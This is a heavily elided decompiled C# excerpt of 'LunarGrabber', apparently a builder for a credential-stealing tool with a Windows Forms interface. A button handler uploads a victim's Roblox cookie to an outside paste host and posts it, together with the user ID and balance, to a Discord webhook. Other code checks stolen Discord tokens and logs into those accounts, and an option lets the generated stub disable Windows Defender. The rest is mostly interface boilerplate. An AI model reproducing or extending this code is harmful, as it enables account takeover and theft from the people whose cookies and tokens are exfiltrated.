...
namespace LunarGrabber
{
	...
	public class MainForm : MetroForm
	{
		...
		public static string CreatePaste(string content)
		{
			...
			string text = webClient.UploadString("https://asteroid.loca.lt/documents", content);
			JToken arg = JObject.Parse(text)["key"];
		...
		private string Options(string code)
		{
			...
			code = code.Replace("falseDefender", this.windowsdefender.Checked.ToString());
			code = code.Replace("generatedBy", MainForm.authusername);
			code = code.Replace("stubVersion", "2.0");
		...
		// Token: 0x0600009D RID: 157 RVA: 0x00006664 File Offset: 0x00004864
		...
		// Token: 0x0600009E RID: 158 RVA: 0x0000701C File Offset: 0x0000521C
		...
		// Token: 0x0600009F RID: 159 RVA: 0x00007064 File Offset: 0x00005264
		...
		// Token: 0x060000A0 RID: 160 RVA: 0x0000708C File Offset: 0x0000528C
		...
		// Token: 0x060000A1 RID: 161 RVA: 0x0000733C File Offset: 0x0000553C
		...
		// Token: 0x060000A2 RID: 162 RVA: 0x00007390 File Offset: 0x00005590
		...
		// Token: 0x060000A4 RID: 164 RVA: 0x00007454 File Offset: 0x00005654
		...
		// Token: 0x060000A5 RID: 165 RVA: 0x000074A4 File Offset: 0x000056A4
		...
		// Token: 0x060000A6 RID: 166 RVA: 0x00007509 File Offset: 0x00005709
		...
		// Token: 0x060000A7 RID: 167 RVA: 0x00007538 File Offset: 0x00005738
		...
		// Token: 0x060000A8 RID: 168 RVA: 0x0000759D File Offset: 0x0000579D
		...
		// Token: 0x060000A9 RID: 169 RVA: 0x000075B8 File Offset: 0x000057B8
		...
		// Token: 0x060000AA RID: 170 RVA: 0x000075FF File Offset: 0x000057FF
		...
		// Token: 0x060000AB RID: 171 RVA: 0x00007630 File Offset: 0x00005830
		...
		// Token: 0x060000AC RID: 172 RVA: 0x00007678 File Offset: 0x00005878
		private bool ValidToken(string token)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v8/users/@me");
		...
		// Token: 0x060000AD RID: 173 RVA: 0x000076E0 File Offset: 0x000058E0
		private void redTrackBar_ValueChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
		}

		// Token: 0x060000AE RID: 174 RVA: 0x000076E0 File Offset: 0x000058E0
		private void greenTrackBar_ValueChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
		}

		// Token: 0x060000AF RID: 175 RVA: 0x000076E0 File Offset: 0x000058E0
		private void blueTrackBar_ValueChanged(object sender, EventArgs e)
		{
			this.embedColorPictureBox.BackColor = Color.FromArgb(this.redTrackBar.Value, this.greenTrackBar.Value, this.blueTrackBar.Value);
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00007714 File Offset: 0x00005914
		...
		// Token: 0x060000B1 RID: 177 RVA: 0x00007789 File Offset: 0x00005989
		...
		// Token: 0x060000B7 RID: 183 RVA: 0x000079B0 File Offset: 0x00005BB0
		...
		// Token: 0x060000B8 RID: 184 RVA: 0x00007A24 File Offset: 0x00005C24
		...
		// Token: 0x060000B9 RID: 185 RVA: 0x00007A98 File Offset: 0x00005C98
		...
		// Token: 0x060000BA RID: 186 RVA: 0x00007B0C File Offset: 0x00005D0C
		...
		// Token: 0x060000BB RID: 187 RVA: 0x00007B80 File Offset: 0x00005D80
		...
		// Token: 0x060000BF RID: 191 RVA: 0x00007BF4 File Offset: 0x00005DF4
		private void metroButton3_Click(object sender, EventArgs e)
		{
			...
			if (webClient.DownloadString("http://www.roblox.com/mobileapi/userinfo").Contains("ThumbnailUrl"))
			{
				...
				string text2 = MainForm.CreatePaste(text);
				long userID = jsonReader.UserID;
				string text3 = Convert.ToString(userID);
				...
				string text4 = Convert.ToString(isAnyBuildersClubMember);
				...
				try
				{
					...
					embedMaker.AddField("UserID: ", text3, false);
					embedMaker.AddField("Balance: ", str + " R$", false);
					embedMaker.AddField("Premium: ", text4, false);
					embedMaker.AddField("ROBLOX Cookie: ", text2, false);
					string text5 = this.webhookIDbox.Text;
					ulong num = Convert.ToUInt64(text5);
					WebhookExtensions.SendWebhookMessageAsync(discordSocketClient, num, this.webhookTextBox.Text, "", embedMaker, null);
		...
		// Token: 0x060000C1 RID: 193 RVA: 0x000038A0 File Offset: 0x00001AA0
		private void builderTab_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000C2 RID: 194 RVA: 0x00007DA4 File Offset: 0x00005FA4
		private void metroButton1_Click_1(object sender, EventArgs e)
		{
			if (this.ValidToken(this.loginTextBox1.Text))
			{
				new DiscordForm(this.loginTextBox1.Text).Show();
				return;
			}
			MessageBox.Show("Token is invalid!", OnProgramStart.Name, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x00007DE2 File Offset: 0x00005FE2
		...
		// Token: 0x060000C4 RID: 196 RVA: 0x00007E04 File Offset: 0x00006004
		private void InitializeComponent()
		{
			...
			this.windowsdefender = new MetroCheckBox();
			...
			this.loginTextBox1 = new MetroTextBox();
			...
			this.builderTab.Click += this.builderTab_Click;
			...
			this.optionsTab.Controls.Add(this.windowsdefender);
			...
			this.windowsdefender.AutoSize = true;
			this.windowsdefender.Location = new Point(477, 145);
			this.windowsdefender.Name = "windowsdefender";
			this.windowsdefender.Size = new Size(164, 15);
			this.windowsdefender.TabIndex = 51;
			this.windowsdefender.Text = "Disbale Windows Defender";
			this.windowsdefender.Theme = 2;
			this.metroToolTip.SetToolTip(this.windowsdefender, "Disable the Internet");
			this.windowsdefender.UseSelectable = true;
			...
			this.extraTab.Location = new Point(4, 35);
			this.extraTab.Name = "extraTab";
			this.extraTab.Size = new Size(845, 237);
			...
			this.pluginsTab.Location = new Point(4, 35);
			this.pluginsTab.Name = "pluginsTab";
			this.pluginsTab.Size = new Size(845, 237);
			...
			this.pluginTextBox.AutoScrollMinSize = new Size(2, 14);
			...
			this.metroButton1.Location = new Point(23, 48);
			this.metroButton1.Name = "metroButton1";
			this.metroButton1.Size = new Size(382, 22);
			this.metroButton1.TabIndex = 77;
			this.metroButton1.Text = "Login";
			this.metroButton1.Theme = 2;
			this.metroButton1.UseSelectable = true;
			this.metroButton1.Click += this.metroButton1_Click_1;
			this.loginTextBox1.CustomButton.Image = null;
			this.loginTextBox1.CustomButton.Location = new Point(362, 2);
			this.loginTextBox1.CustomButton.Name = "";
			this.loginTextBox1.CustomButton.Size = new Size(17, 17);
			this.loginTextBox1.CustomButton.Style = 4;
			this.loginTextBox1.CustomButton.TabIndex = 1;
			this.loginTextBox1.CustomButton.Theme = 1;
			this.loginTextBox1.CustomButton.UseSelectable = true;
			this.loginTextBox1.CustomButton.Visible = false;
			this.loginTextBox1.ForeColor = Color.White;
			this.loginTextBox1.Lines = new string[0];
			this.loginTextBox1.Location = new Point(23, 20);
			this.loginTextBox1.MaxLength = 32767;
			this.loginTextBox1.Name = "loginTextBox1";
			this.loginTextBox1.PasswordChar = '\0';
			this.loginTextBox1.PromptText = "token";
			this.loginTextBox1.ScrollBars = ScrollBars.None;
			this.loginTextBox1.SelectedText = "";
			this.loginTextBox1.SelectionLength = 0;
			this.loginTextBox1.SelectionStart = 0;
			this.loginTextBox1.ShortcutsEnabled = true;
			this.loginTextBox1.Size = new Size(382, 22);
			this.loginTextBox1.TabIndex = 76;
			this.loginTextBox1.Theme = 2;
			this.metroToolTip.SetToolTip(this.loginTextBox1, "Discord token to Login into the account");
			this.loginTextBox1.UseSelectable = true;
			this.loginTextBox1.WaterMark = "token";
			this.loginTextBox1.WaterMarkColor = Color.FromArgb(109, 109, 109);
			this.loginTextBox1.WaterMarkFont = new Font("Segoe UI", 12f, FontStyle.Italic, GraphicsUnit.Pixel);
		...
		private MetroCheckBox windowsdefender;

		// Token: 0x040000B2 RID: 178
		private MetroButton metroButton1;

		// Token: 0x040000B3 RID: 179
		private MetroTextBox loginTextBox1;

		// Token: 0x02000018 RID: 24
		private class JsonReader
		{
			// Token: 0x17000020 RID: 32
			// (get) Token: 0x060000C6 RID: 198 RVA: 0x0000D9EF File Offset: 0x0000BBEF
			// (set) Token: 0x060000C7 RID: 199 RVA: 0x0000D9F7 File Offset: 0x0000BBF7
			public long UserID { get; set; }

			// Token: 0x17000021 RID: 33
			// (get) Token: 0x060000C8 RID: 200 RVA: 0x0000DA00 File Offset: 0x0000BC00
			// (set) Token: 0x060000C9 RID: 201 RVA: 0x0000DA08 File Offset: 0x0000BC08
			public string UserName { get; set; }

			// Token: 0x17000022 RID: 34
			// (get) Token: 0x060000CA RID: 202 RVA: 0x0000DA11 File Offset: 0x0000BC11
			// (set) Token: 0x060000CB RID: 203 RVA: 0x0000DA19 File Offset: 0x0000BC19
			public long RobuxBalance { get; set; }

			// Token: 0x17000023 RID: 35
			// (get) Token: 0x060000CC RID: 204 RVA: 0x0000DA22 File Offset: 0x0000BC22
			// (set) Token: 0x060000CD RID: 205 RVA: 0x0000DA2A File Offset: 0x0000BC2A
			public bool IsAnyBuildersClubMember { get; set; }

			// Token: 0x17000024 RID: 36
			// (get) Token: 0x060000CE RID: 206 RVA: 0x0000DA33 File Offset: 0x0000BC33
			// (set) Token: 0x060000CF RID: 207 RVA: 0x0000DA3B File Offset: 0x0000BC3B
		...
		{
			// Token: 0x060000D1 RID: 209 RVA: 0x0000DA44 File Offset: 0x0000BC44
			...
			// Token: 0x060000D2 RID: 210 RVA: 0x0000DA50 File Offset: 0x0000BC50
			...
			private class IconFile
			{
				...
				// (get) Token: 0x060000D8 RID: 216 RVA: 0x0000DAD0 File Offset: 0x0000BCD0
				...
				// Token: 0x060000D9 RID: 217 RVA: 0x0000DADD File Offset: 0x0000BCDD
				public byte[] ImageData(int index)
				{
					return this.iconImage[index];
				}

				// Token: 0x060000DA RID: 218 RVA: 0x0000DAE8 File Offset: 0x0000BCE8
				...
				// Token: 0x060000DB RID: 219 RVA: 0x0000DC18 File Offset: 0x0000BE18
